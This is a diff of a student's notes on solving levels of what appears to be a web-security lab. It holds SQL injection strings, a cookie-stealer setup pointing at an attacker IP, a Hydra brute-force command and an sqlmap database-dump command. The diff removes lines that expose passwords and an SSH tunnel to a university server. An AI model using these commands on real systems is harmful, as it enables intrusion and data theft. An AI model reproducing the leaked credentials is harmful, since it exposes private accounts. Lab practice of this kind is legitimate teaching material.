@@ -1,3 +1,5 @@
+Below are instructions to complete these levels however there may be other ways:
+
 level 1:
 ' OR '1='1'
 ORDER BY 1,2,3--
@@ -31,13 +33,6 @@ for cookie stealer + linux
 -disconnect other connections other than the linux's IP
 -add back connections if you want to go back to normal
 
--if using uni wifi need to configure kali linux
--ensure network is on the default gateway of the laptop IP and vise versa
--find ip using cmd
--cookie script will be kali linux ip btw remember that
--the ip above is the accommodation wifi ont uni wifi
--uni wifi address 10.99.216.1 net mask 20 gateway 10.99.216.66
--accommodation wifi address 10.57.64.1 net mask 20 gateway 10.57.72.79
 
 level 4:
 essentially the same as level 3
@@ -48,8 +43,7 @@ normal brute force password attack
 level 6:
 -need to have kali linux running the website first then do below
 -hydra -l admin -P wordlist 10.57.72.79 http-post-form "/level6.php:password=^PASS^:Login failed" -V -s 8000
--change ip for uni wifi
-//note this doesnt include logging yet. Make sure Hyrda isn't affected from changed
+
 
 level 7:
 -kali linux accessing the website level 7
@@ -60,22 +54,3 @@ sqlmap -u "http://10.57.72.79:8000/level7.php" \
 -should display all information in the database
 
 
-Poseidon stuff down below
-
-GieYG6RQvVJ9iiZ - admin password
-Vvqzh4wGLjhkBO8 - mariadb password
-
-x7KlwhK7Meurr4h - new mariadb password 14/03/2025
-
-ssh -L 3306:localhost:3306 sgc144@poseidon.salford.ac.uk
-
-
-1. -disable any port 3306 running in background
-
-netstat -ano | findstr :3306
-tasklist | findstr 6008
-taskkill /PID 6008 /F
-
-2. -run phpstorm configure things normally, in passwords put in mariaDB password not VMin password
-
-3. Within the database.php it needs to be localhost not poseidon
